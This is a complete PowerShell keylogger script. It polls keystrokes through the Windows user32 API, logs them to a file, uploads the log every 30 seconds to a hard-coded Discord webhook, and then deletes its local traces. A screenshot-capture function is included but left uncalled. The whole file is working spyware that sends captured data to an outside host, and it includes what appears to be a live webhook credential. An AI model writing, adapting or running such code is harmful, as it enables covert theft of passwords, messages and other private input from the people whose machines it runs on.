# Load necessary .NET assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Housekeeping
$WEBHOOK_URL = "https://discord.com/api/webhooks/1462582585132847211/M7Twj4Dn31u0l4orBDpO5MnPsgUTsSJYSuuGqT8HQImL1a6ht5OPwkN4tqjX3YEG6Vy5"
$save_dir = Join-Path $PSScriptRoot "lab_outputs"

# Create directory if it doesn't exist
if (-not (Test-Path $save_dir)) {
    New-Item -Path $save_dir -ItemType Directory | Out-Null
}

$KEYLOG_FILE = Join-Path $save_dir "keylog.txt"

# Define Win32 API to capture keystrokes
$Signature = @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type -TypeDefinition $Signature

# screenshot function
function Take-Screenshot {
    $filename = Join-Path $save_dir "screenshot.png"
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $top    = $screen.Bounds.Top
    $left   = $screen.Bounds.Left
    $width  = $screen.Bounds.Width
    $height = $screen.Bounds.Height
    
    $bitmap = New-Object System.Drawing.Bitmap -ArgumentList $width, $height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    
    $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    return $filename
}

# send media to discord webhook
function Send-ToDiscord {
    # read Keylogs
    $keylog_data = ""
    if (Test-Path $KEYLOG_FILE) {
        $keylog_data = Get-Content -Path $KEYLOG_FILE -Raw
        # Clear after reading (mimics open(KEYLOG_FILE, "w").close())
        Clear-Content -Path $KEYLOG_FILE
    }

    # send keylogs
    if (-not [string]::IsNullOrEmpty($keylog_data)) {
        $payload = @{
            content = "# keylogs:`n$keylog_data"
        } | ConvertTo-Json
        
        try {
            Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -ContentType "application/json" -Body $payload
        } catch {
            Write-Error "Failed to send data to Discord: $_"
        }
    }

    # cleanup
    $files = Get-ChildItem -Path $save_dir
    foreach ($file in $files) {
        try {
            Remove-Item -Path $file.FullName -Force
        } catch {
            Write-Host "Error deleting file $($file.FullName): $_"
        }
    }
}

# Main Execution Loop logic
# Since PowerShell doesn't have a background listener like Python's pynput, 
# we use a polling loop to capture keys while checking the timer.

$last_upload_time = Get-Date

Write-Host "Logger started. Press Ctrl+C to stop."

while ($true) {
    # 1. Capture Keystrokes (Polling)
    # Checks standard ASCII range + some special keys
    for ($i = 8; $i -le 190; $i++) {
        $state = [KeyLogger]::GetAsyncKeyState($i)
        
        # If the key is pressed
        if ($state -eq -32767) {
            $key = ""
            switch ($i) {
                8   { $key = "[BACKSPACE]" }
                9   { $key = "[TAB]" }
                13  { $key = "[ENTER]`n" }
                32  { $key = " " }
                160 { $key = "[L-SHIFT]" }
                161 { $key = "[R-SHIFT]" }
                default { $key = [char]$i }
            }
            $key | Out-File -FilePath $KEYLOG_FILE -Append -NoNewline
        }
    }

    # 2. Check if 30 seconds have passed for Discord upload
    $current_time = Get-Date
    if (($current_time - $last_upload_time).TotalSeconds -ge 30) {
        # Note: take_screenshot is defined but, following the Python logic, 
        # it is only called here if you want it included in the cleanup/upload.
        # Take-Screenshot | Out-Null 
        
        Send-ToDiscord
        $last_upload_time = Get-Date
    }

    # Small sleep to prevent 100% CPU usage during polling
    Start-Sleep -Milliseconds 10
}
